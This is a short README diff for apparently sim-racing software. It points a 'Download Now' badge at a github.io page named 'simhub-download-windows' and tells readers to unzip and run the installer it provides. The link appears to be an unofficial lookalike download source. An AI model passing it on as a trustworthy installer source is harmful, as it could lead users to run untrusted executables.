@@ -8,7 +8,7 @@ It supports a variety of sims including **iRacing, Assetto Corsa, rFactor 2, and
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-lightblue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-lightblue?style=for-the-badge)](https://simhub-download-windows.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer on your Windows PC.  
